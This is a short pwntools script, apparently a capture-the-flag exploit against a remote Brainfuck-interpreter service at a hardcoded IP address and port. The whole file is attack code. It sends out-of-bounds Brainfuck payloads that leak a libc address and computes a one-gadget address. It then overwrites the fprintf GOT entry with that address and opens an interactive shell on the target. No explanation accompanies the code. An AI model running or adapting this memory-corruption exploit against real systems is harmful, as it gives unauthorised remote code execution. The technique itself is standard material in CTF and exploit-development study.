from pwn import *
p = remote('58.229.240.181', 7777)
# leak libc
p.sendlineafter('>>>', '+>>>>>>+[-<<<<]+[-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<]>[.>]')
p.recv()
libc = u64(p.recvuntil('\x7f').ljust(8, '\x00')) + 0x697481a
magic = libc + 0x10a38c
print 'libc : ' + hex(libc)
# overwrite fprintf@got
p.sendlineafter('>>>', '+>>>>>>+[-<<<<]+[-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<]>[,>]')
p.send(p64(magic))
p.sendlineafter('>>>', '<.')
p.interactive()
